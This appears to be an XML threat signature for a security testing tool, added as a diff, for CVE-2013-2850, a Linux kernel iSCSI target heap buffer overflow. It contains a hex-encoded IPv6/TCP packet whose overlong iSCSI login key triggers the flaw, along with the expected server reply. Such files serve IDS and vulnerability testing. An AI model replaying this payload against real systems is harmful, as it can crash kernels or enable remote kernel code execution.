@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Linux Kernel iscsi_add_notunderstood_response Heap Buffer Overflow [IPv6, Version]"/>
+    <EngDesc display="true" value="A  heap  buffer  overflow  vulnerability  has  been  reported  in  the  Linux  Kernel.  The  vulnerability  is  in  the&#13;&#10;iscsi_add_notunderstood_response()  function  in  the  iscsi_target  driver  and  is  due  to  the  way  a notunderstood&#13;&#10;response is created after processing very long keys.&#13;&#10;A remote, unauthenticated attacker can exploit this vulnerability by sending an overly long key. A successful attack&#13;&#10;can result in arbitrary code execution with kernel privileges. An unsuccessful attack will cause the kernel to crash&#13;&#10;resulting in a denial-of-service condition."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="IPv6,iSCSI"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Linux"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Linux_Kernel_Project_Kernel"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="3.1_and_higher"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20130531-01"/>
+    <CVEID display="true" value="CVE-2013-2850"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="93755"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="73790474e9df4d9d5cf8db9e02cc02ff"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="none"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635073240195644987"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1386671416" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="C"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="C"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:03:B1" destMac="00:50:56:B4:0D:94" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="53217" destPort="$HTTPdestPort" SeqNumber="0AFEECF5" AckNumber="E755CE02" HeaderLength="08" WindowSize="0073" Checksum="329B" UrgentPointer="0000" Options="0101080A0178B67B001C7F88" Payload="438100000000012800023D02000000000000000000000000000000000000000001010101010101010101010101010101496E69746961746F724E616D653D69716E2E323031332D30362E7672742E74656C75732E636F6D3A30313A61005461726765744E616D653D69716E2E323030332D30312E6F72672E6C696E75782D69736373692E776F726B6E6573732E78383636343A736E2E3566306334313561363063340053657373696F6E547970653D4E6F726D616C004141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141413D41414141414141414141000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0D:94" destMac="00:50:56:B4:03:B1" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <TCP srcPort="$HTTPdestPort" destPort="53217" SeqNumber="E755CE02" AckNumber="0AFEEE55" HeaderLength="08" WindowSize="007A" Checksum="093F" UrgentPointer="0000" Options="0101080A001C7F8D0178B67B" Payload="230000000000009F00023D02000000000000000000000000CD352DAA0000000000000000000000000000000000000000417574684D6574686F643D434841502C4E6F6E6500546172676574416C6961733D4C494F2054617267657400546172676574506F7274616C47726F75705461673D3100414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414E6F74556E64657273746F6F643D4E6F74556E64657273746F6F640000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
